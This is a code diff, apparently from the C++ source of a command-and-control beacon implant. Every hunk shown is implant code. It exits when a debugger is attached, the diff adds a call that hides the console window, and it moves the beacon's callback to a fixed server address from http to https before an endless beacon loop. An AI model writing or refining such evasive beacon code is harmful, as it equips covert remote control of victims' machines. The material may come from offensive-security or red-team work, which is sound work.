@@ -500,6 +500,8 @@ int Entry() {
 #ifndef DEBUG
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (pPEB->BeingDebugged) return 0;
+
+    FreeConsole();
 #endif
 #ifdef DELAY
     ULONGLONG uptimeBeforeSleep = GetTickCount64();
@@ -520,12 +522,12 @@ int Entry() {
 #endif
 #endif
 #ifdef HTTP
-    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
+    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "https://192.168.161.50" }, 10, 10, 10);
 #endif
     //  PIVOT
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
     while (1) {
         BeaconMainLoop(beacon);
 
